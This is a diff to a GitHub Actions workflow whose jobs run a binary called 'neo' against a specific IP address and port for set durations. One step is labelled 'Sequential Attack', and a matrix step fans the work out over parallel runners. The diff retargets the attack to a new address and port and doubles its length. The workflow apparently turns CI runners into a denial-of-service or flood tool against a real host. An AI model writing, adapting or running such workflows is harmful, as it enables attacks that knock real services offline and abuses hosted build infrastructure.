@@ -10,7 +10,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x neo
-      - run: ./neo 91.108.13.38 32000 10
+      - run: ./neo 91.108.17.23 32003 10
 
   stage-1:
     needs: stage-0
@@ -21,7 +21,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x neo
-      - run: ./neo 91.108.13.38 32000 60
+      - run: ./neo 91.108.17.23 32003 120
 
   stage-2-calc:
     needs: stage-0
@@ -31,7 +31,7 @@ jobs:
     steps:
       - id: calc
         run: |
-          NUM_JOBS=$((60 / 10))  # FIXED
+          NUM_JOBS=$((120 / 10))  # FIXED
           if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi  # Safety check
           ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
           echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
@@ -48,4 +48,4 @@ jobs:
       - name: Sequential Attack
         run: |
           chmod +x neo
-          ./neo 91.108.13.38 32000 10
+          ./neo 91.108.17.23 32003 10
